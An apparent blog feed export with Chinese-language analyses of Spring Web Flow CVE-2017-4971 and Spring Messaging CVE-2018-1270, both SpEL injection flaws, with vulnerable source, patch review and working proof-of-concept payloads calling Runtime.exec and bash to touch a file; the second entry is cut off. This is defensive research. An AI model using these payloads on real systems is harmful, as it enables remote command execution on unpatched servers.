<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-02-09T14:12:35.753Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析Spring Web Flow之CVE-2017-4971</title>
    <link href="https://www.mi1k7ea.com/2020/02/09/%E6%B5%85%E6%9E%90Spring-WebFlow%E4%B9%8BCVE-2017-4971/"/>
    <id>https://www.mi1k7ea.com/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/</id>
    <published>2020-02-09T04:12:36.000Z</published>
    <updated>2020-02-09T14:12:35.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Web-Flow"><a href="#0x01-Spring-Web-Flow" class="headerlink" title="0x01 Spring Web Flow"></a>0x01 Spring Web Flow</h2><p>Spring Web Flow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来，其最主要的目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题。</p><p>具体更多的简介可参考IBM的文章：<a href="https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html" target="_blank" rel="noopener">Spring Web Flow 2.0 入门</a></p><h2 id="0x02-CVE-2017-4971"><a href="#0x02-CVE-2017-4971" class="headerlink" title="0x02 CVE-2017-4971"></a>0x02 CVE-2017-4971</h2><p>在Spring Web Flow 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Web Flow 2.4.0 ~ 2.4.4</li><li>一些老的不再支持的版本也受影响</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulapps的环境（Vulhub的环境在下载时老不成功）：</p><p><a href="http://vulapps.evalbug.com/s_springwebflow_1/" target="_blank" rel="noopener">http://vulapps.evalbug.com/s_springwebflow_1/</a></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>在Web Flow配置文件中view-state节点中指定了model属性，并且没有指定绑定的参数，即view-state中没有配置binder节点；</li><li>MvcViewFactoryCreator类中useSpringBeanBinding默认值（false）未修改；</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先访问/login的接口登录进去，然后随便选择一家酒店点击Book来预订，最后点击Confirm确认，同时用Burp拦截这个Confirm报文，在POST的请求内容中添加如下PoC参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;_T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)</span><br><span class="line">或</span><br><span class="line">&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;touch /tmp/mi1k7ea&quot;)).start()</span><br></pre></td></tr></table></figure><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/1.png" alt=""></p><p>此时后台就能看到SpEL表达式注入漏洞被成功触发了：</p><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/2.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，只从补丁处开始做简单的漏洞点分析。</p><p>代码路径：<a href="https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java</a></p><p>漏洞点位于AbstractMvcView类的addEmptyValueMapping()函数，这里ExpressionParser.parseExpression()函数是用于执行传入的第一个参数field的SpEL表达式，即关键在于addEmptyValueMapping()函数第二个参数field是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Adds a special &#123;<span class="doctag">@link</span> DefaultMapping&#125; that results in setting the target field on the model to an empty value</span></span><br><span class="line"><span class="comment"> * (typically null).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mapper the mapper to add the mapping to</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field the field for which a mapping is to be added</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> model the model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addEmptyValueMapping</span><span class="params">(DefaultMapper mapper, String field, Object model)</span> </span>&#123;</span><br><span class="line">ParserContext parserContext = <span class="keyword">new</span> FluentParserContext().evaluate(model.getClass());</span><br><span class="line">Expression target = expressionParser.parseExpression(field, parserContext);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; propertyType = target.getValueType(model);</span><br><span class="line">Expression source = <span class="keyword">new</span> StaticExpression(getEmptyValue(propertyType));</span><br><span class="line">DefaultMapping mapping = <span class="keyword">new</span> DefaultMapping(source, target);</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Adding empty value mapping for parameter '"</span> + field + <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">mapper.addMapping(mapping);</span><br><span class="line">&#125; <span class="keyword">catch</span> (EvaluationException e) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用addEmptyValueMapping()的函数有两个，都在AbstractMvcView类中，分别为addModelBindings()和addDefaultMappings()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addDefaultMappings</span><span class="params">(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (String parameterName : parameterNames) &#123;</span><br><span class="line"><span class="keyword">if</span> (fieldMarkerPrefix != <span class="keyword">null</span> &amp;&amp; parameterName.startsWith(fieldMarkerPrefix)) &#123;</span><br><span class="line">String field = parameterName.substring(fieldMarkerPrefix.length());</span><br><span class="line"><span class="keyword">if</span> (!parameterNames.contains(field)) &#123;</span><br><span class="line">addEmptyValueMapping(mapper, field, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMapping(mapper, parameterName, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addModelBindings</span><span class="params">(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (Binding binding : binderConfiguration.getBindings()) &#123;</span><br><span class="line">String parameterName = binding.getProperty();</span><br><span class="line"><span class="keyword">if</span> (parameterNames.contains(parameterName)) &#123;</span><br><span class="line">addMapping(mapper, binding, model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (fieldMarkerPrefix != <span class="keyword">null</span> &amp;&amp; parameterNames.contains(fieldMarkerPrefix + parameterName)) &#123;</span><br><span class="line">addEmptyValueMapping(mapper, parameterName, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这两个函数都调用了存在缺陷的函数，那么我们看看哪个函数才能实际控制field参数。</p><blockquote><p>这里比较明显的区别就是 addModelBindings 函数中 <code>for (Binding binding : binderConfiguration.getBindings())</code> 存在这样一个循环，而且就是这个循环的控制决定了 field 参数的值，经过进一步分析，这里控制 field 的参数的决定性因素就是 binderConfiguration 这个变量所控制的值，这里经过源码的跟踪我们可以发现，binderConfiguration 函数的值就是 webflow-*.xml 中 view-state 中 binder 节点的配置，所以这个函数的值来源于配置文件，所以这个函数我们无法控制，从而无法触发漏洞，所以我们重点来看看 addDefaultMappings 这个函数，我们发现 addDefaultMappings 中我们可以控制 field 参数，所以我们重点来看看如何去触发这个函数。</p></blockquote><p>而同文件中的bind()函数是根据binderConfiguration值是否为null来区分调用这两个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> MappingResults <span class="title">bind</span><span class="params">(Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Binding to model"</span>);</span><br><span class="line">&#125;</span><br><span class="line">DefaultMapper mapper = <span class="keyword">new</span> DefaultMapper();</span><br><span class="line">ParameterMap requestParameters = requestContext.getRequestParameters();</span><br><span class="line"><span class="keyword">if</span> (binderConfiguration != <span class="keyword">null</span>) &#123;</span><br><span class="line">addModelBindings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMappings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mapper.map(requestParameters, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到当binderConfiguration值为null时才会调用漏洞函数addDefaultMappings()，这也是前提条件之一，在接下来会将原因。</p><p>最终，我们可以得到如下几个关键函数调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind()-&gt;addDefaultMappings()-&gt;addEmptyValueMapping()-&gt;parseExpression()</span><br></pre></td></tr></table></figure><h4 id="必须view-state中未配置binder节点的原因"><a href="#必须view-state中未配置binder节点的原因" class="headerlink" title="必须view-state中未配置binder节点的原因"></a>必须view-state中未配置binder节点的原因</h4><p>我们看到bind()函数的源码，在spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView类中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Causes the model to be populated from information contained in request parameters.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If a view has binding configuration then only model fields specified in the binding configuration will be</span></span><br><span class="line"><span class="comment"> * considered. In the absence of binding configuration all request parameters will be used to update matching fields</span></span><br><span class="line"><span class="comment"> * on the model.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> model the model to be updated</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an instance of MappingResults with information about the results of the binding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> MappingResults <span class="title">bind</span><span class="params">(Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Binding to model"</span>);</span><br><span class="line">&#125;</span><br><span class="line">DefaultMapper mapper = <span class="keyword">new</span> DefaultMapper();</span><br><span class="line">ParameterMap requestParameters = requestContext.getRequestParameters();</span><br><span class="line"><span class="keyword">if</span> (binderConfiguration != <span class="keyword">null</span>) &#123;</span><br><span class="line">addModelBindings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMappings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mapper.map(requestParameters, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个if判断语句，条件是判断binderConfiguration是否为null。这里只有binderConfiguration为null时，才会进入后面调用存在漏洞的addDefaultMappings()函数的代码逻辑。而binderConfiguration的值是由配置文件中是否有binder节点来控制的。</p><p>看到spring-webflow/src/main/java/org/springframework/webflow/engine/model/builder/xml/XmlFlowModelBuilder类中相关的函数定义，其中parseState()函数用于解析节点，当判断到view-state节点后就调用parseViewState()函数作进一步解析处理，其中调用parseBinder()函数来获取binder字节的内容并设置到binder中，当不存在binder节点时直接返回null：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> AbstractStateModel <span class="title">parseState</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DomUtils.nodeNameEquals(element, <span class="string">"view-state"</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> parseViewState(element);</span><br><span class="line">&#125;</span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> ViewStateModel <span class="title">parseViewState</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">ViewStateModel state = <span class="keyword">new</span> ViewStateModel(element.getAttribute(<span class="string">"id"</span>));</span><br><span class="line">...</span><br><span class="line">state.setBinder(parseBinder(element));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> BinderModel <span class="title">parseBinder</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">Element binderElement = DomUtils.getChildElementByTagName(element, <span class="string">"binder"</span>);</span><br><span class="line"><span class="keyword">if</span> (binderElement != <span class="keyword">null</span>) &#123;</span><br><span class="line">BinderModel binder = <span class="keyword">new</span> BinderModel();</span><br><span class="line">binder.setBindings(parseBindings(binderElement));</span><br><span class="line"><span class="keyword">return</span> binder;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中没找到binder节点后就会返回null，之后binderConfiguration的值就被设置为了null。</p><h4 id="必须useSpringBeanBinding默认值（false）未修改的原因"><a href="#必须useSpringBeanBinding默认值（false）未修改的原因" class="headerlink" title="必须useSpringBeanBinding默认值（false）未修改的原因"></a>必须useSpringBeanBinding默认值（false）未修改的原因</h4><p>为啥前提条件要useSpringBeanBinding为默认值false即未修改过？</p><p>查看spring-webflow/src/main/java/org/springframework/webflow/mvc/builder/MvcViewFactoryCreator类的createViewFactory()函数，看到如果useSpringBeanBinding这个属性为false则使用默认的解析类，如果这个值为true则使用BeanWrapperExpressionParser类来解析，而该类是无法执行SpEL表达式的（具体可看补丁分析）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ViewFactory <span class="title">createViewFactory</span><span class="params">(Expression viewId, ExpressionParser expressionParser,</span></span></span><br><span class="line"><span class="function"><span class="params">ConversionService conversionService, BinderConfiguration binderConfiguration,</span></span></span><br><span class="line"><span class="function"><span class="params">Validator validator, ValidationHintResolver validationHintResolver)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (useSpringBeanBinding) &#123;</span><br><span class="line">expressionParser = <span class="keyword">new</span> BeanWrapperExpressionParser(conversionService);</span><br><span class="line">&#125;</span><br><span class="line">AbstractMvcViewFactory viewFactory = createMvcViewFactory(viewId, expressionParser, conversionService,</span><br><span class="line">binderConfiguration);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(eventIdParameterName)) &#123;</span><br><span class="line">viewFactory.setEventIdParameterName(eventIdParameterName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(fieldMarkerPrefix)) &#123;</span><br><span class="line">viewFactory.setFieldMarkerPrefix(fieldMarkerPrefix);</span><br><span class="line">&#125;</span><br><span class="line">viewFactory.setValidator(validator);</span><br><span class="line">viewFactory.setValidationHintResolver(validationHintResolver);</span><br><span class="line"><span class="keyword">return</span> viewFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>查看官方在Spring Web Flow 2.4.5 版本中的补丁是怎么写的：<a href="https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795</a></p><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/3.png" alt=""></p><p>直接将ExpressionParser设置为BeanWrapperExpressionParser对象的实例，默认是执行不了表达式的。</p><p>查看BeanWrapperExpressionParser的源码：<a href="https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java</a></p><p>其中的parseExpression()函数是直接继承的spring-webflow/spring-binding/src/main/java/org/springframework/binding/expression/support/AbstractExpressionParser类的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// expression parser</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Expression <span class="title">parseExpression</span><span class="params">(String expressionString, ParserContext context)</span> <span class="keyword">throws</span> ParserException </span>&#123;</span><br><span class="line">Assert.notNull(expressionString, <span class="string">"The expression string to parse is required"</span>);</span><br><span class="line"><span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">context = NullParserContext.INSTANCE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (context.isTemplate()) &#123;</span><br><span class="line"><span class="keyword">return</span> parseTemplate(expressionString, context);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (expressionString.startsWith(getExpressionPrefix()) &amp;&amp; expressionString.endsWith(getExpressionSuffix())) &#123;</span><br><span class="line"><span class="keyword">if</span> (!allowDelimitedEvalExpressions) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ParserException(</span><br><span class="line">expressionString,</span><br><span class="line"><span class="string">"The expression '"</span></span><br><span class="line">+ expressionString</span><br><span class="line">+ <span class="string">"' being parsed is expected be a standard OGNL expression. Do not attempt to enclose such expression strings in $&#123;&#125; delimiters--this is redundant. If you need to parse a template that mixes literal text with evaluatable blocks, set the 'template' parser context attribute to true."</span>,</span><br><span class="line"><span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> lastIndex = expressionString.length() - getExpressionSuffix().length();</span><br><span class="line">String ognlExpression = expressionString.substring(getExpressionPrefix().length(), lastIndex);</span><br><span class="line"><span class="keyword">return</span> doParseExpression(ognlExpression, context);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> doParseExpression(expressionString, context);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这里if判断条件的allowDelimitedEvalExpressions，这个默认值是false，因此默认是不能进入里面的代码逻辑、也就执行不了表达式了。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://paper.seebug.org/322/" target="_blank" rel="noopener">Spring Web Flow 远程代码执行漏洞分析(CVE-2017-4971)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Messaging之CVE-2018-1270</title>
    <link href="https://www.mi1k7ea.com/2020/02/08/%E6%B5%85%E6%9E%90Spring-Messaging%E4%B9%8BCVE-2018-1270/"/>
    <id>https://www.mi1k7ea.com/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/</id>
    <published>2020-02-08T04:13:22.000Z</published>
    <updated>2020-02-09T04:03:00.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Messaging"><a href="#0x01-Spring-Messaging" class="headerlink" title="0x01 Spring Messaging"></a>0x01 Spring Messaging</h2><p>Spring Messaging模块为集成Messaging API和消息协议提供支持，包括base、converter、core、handler、simp、support、tcp等模块，其上层协议是STOMP，底层通信基于SockJS。</p><p> 几个模块简介如下：</p><p>base：定义了消息Message、消息处理MessageHandler、发送消息MessageChannel；Message由两部分组成，即Header和Payload；MessageHandler是一个处理消息的约定，Spring Messaging提供了丰富的消息处理方式；MessageChannel表现为pipes-and-filters架构的管道。</p><ul><li>converter：对消息转换提供支持。</li><li>core：提供消息的模板方法。</li><li>handler：处理模块。</li><li>simp：包含诸如STOMP协议的简单消息协议的通用支持。STOMP，Streaming Text Orientated Message Protocol，是流文本定向消息协议，是一种为MOM(Message Oriented Middleware，面向消息的中间件)设计的简单文本协议。它提供了一个可互操作的连接格式，允许STOMP客户端与任意STOMP消息代理(Broker)进行交互，类似于OpenWire(一种二进制协议)。由于其设计简单，很容易开发客户端，因此在多种语言和多种平台上得到广泛应用。其中最流行的STOMP消息代理是Apache ActiveMQ。</li><li>support：提供了Message的实现，及创建消息的MessageBuilder和获取消息头的MessageHeaderAccessor，还有各种不同的MessageChannel实现和channel interceptor支持。</li><li>tcp： 一方面提供了通过TcpOperations建立tcp connection、通过TcpConnectionHandler处理消息和通过TcpConnectionf发送消息的抽象及实现；另一方面包含了对基于Reactor的tcp 消息支持。</li></ul><h2 id="0x02-CVE-2018-1270"><a href="#0x02-CVE-2018-1270" class="headerlink" title="0x02 CVE-2018-1270"></a>0x02 CVE-2018-1270</h2><blockquote><p>Spring框架中通过spring-messaging模块来实现STOMP（Simple Text-Orientated Messaging Protocol），STOMP是一种封装WebSocket的简单消息协议。攻击者可以通过建立WebSocket连接并发送一条消息造成远程代码执行。</p></blockquote><p>具体地说，在Spring Messaging中，其允许客户端订阅消息，并使用selector过滤消息。其中selector用SpEL表达式编写，并使用StandardEvaluationContext解析，从而导致SpEL表达式注入漏洞。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Framework 5.0 to 5.0.4  </li><li>Spring Framework 4.3 to 4.3.14</li><li>Older unsupported versions are also affected</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://vulhub.org/#/environments/spring/CVE-2018-1270/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2018-1270/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Method1"><a href="#Method1" class="headerlink" title="Method1"></a>Method1</h4><p>访问页面，打开F12看到存在app.js文件，其中connect()函数用于建立SockJS连接：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/1.png" alt=""></p><p>这里直接篡改app.js的内容，插入恶意selector代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('touch /tmp/mi1k7ea')"</span>&#125;;</span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(<span class="string">'/gs-guide-websocket'</span>);</span><br><span class="line">    stompClient = Stomp.over(socket);</span><br><span class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">frame</span>) </span>&#123;</span><br><span class="line">        setConnected(<span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Connected: '</span> + frame);</span><br><span class="line">        stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</span><br><span class="line">            showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</span><br><span class="line">        &#125;,header);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/2.png" alt=""></p><p>此时在Web界面点击Connect再随便Send几个字符，就能成功触发漏洞：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/3.png" alt=""></p><h4 id="Method2"><a href="#Method2" class="headerlink" title="Method2"></a>Method2</h4><p>使用Burp抓包，点击Connect，拦截到如下WebSocket报文：</p><p><img 